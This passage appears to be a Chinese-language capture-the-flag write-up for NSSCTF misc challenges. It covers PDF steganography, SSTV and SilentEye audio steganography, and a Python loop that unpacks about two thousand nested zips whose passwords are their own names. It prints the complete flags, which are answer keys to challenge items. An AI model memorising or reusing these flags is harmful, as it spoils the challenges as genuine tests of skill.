利用工具 wbStego4.3open ，发现存在PDF隐写，得到后半段flag

![截图](https://nssctf.wdf.ink/img/yxy/f6c47e5e2d947ac3001c7eff3ec8834b.png)

![截图](https://nssctf.wdf.ink/img/yxy/0563547ff61d1a8910c87bb0fde21416.png)

<br/>

拼凑得到完整flag：NSSCTF{c024c35f-7358-46e2-b330-5ff837a3f9ad}

<br/>

### Call the Alien

wow，呼叫外星的声音格外动听呢，加密通话是吧

考点：==SSTV== ==音频隐写==

前面几个音很有特色，可以断定是SSTV ，先扫描看看

- 扫SSTV时一定要安静，推荐虚拟声卡e2eSoft VSC

扫出来第一段flag：NSSCTF{5a0025e4-

![截图](https://nssctf.wdf.ink/img/yxy/1079ce84b4ccec40204a07d1b1852f8d.png)

音频隐写，使用工具 SilentEye 得到第二段flag

![截图](https://nssctf.wdf.ink/img/yxy/16b5211b8da48d3b235ab88c3b4061c5.png)

亲爱的WD，甚至手抖调了下参数

拼凑得到完整的flag：NSSCTF{5a0025e4-5063-4632-95e5-a32742ea312d}

<br/>

### Continue

是一个压缩包，尝试解压有密码，The password is the same with the name

懂了，套娃，直接上脚本

（Python较慢，至少要跑二三十分钟，有能力的师傅可以试试其他语言）

```python
import zipfile
zip_src='Continue.zip'
while True:
    r = zipfile.is_zipfile(zip_src)
    if r:     
        fz = zipfile.ZipFile(zip_src,"r")
        fz.extractall(pwd=bytes(fz.filename.replace('.zip',''),encoding='utf-8'))
        zip_src=fz.filelist[0].filename
    else:
        break
```

让他慢慢跑

![截图](https://nssctf.wdf.ink/img/yxy/16ff4750161533790a4917d01c41f961.png)

跑完

![1479559098-307906989-FA8EE4D5D740FC77F1B8CB06A4A173F4.png)](https://nssctf.wdf.ink/img/yxy/fa8ee4d5d740fc77f1b8cb06a4a173f4.png)

真狠啊，2k个压缩包

![截图](https://nssctf.wdf.ink/img/yxy/48b4bc8d9c70dc8b2a0b003211d08d6e.png)

得到flag：NSSCTF{09b43595-8b96-4aa4-a5d2-c327c8e41174}

![截图](https://nssctf.wdf.ink/img/yxy/d2b95ca347c091616a8b48f17eda48e0.png)
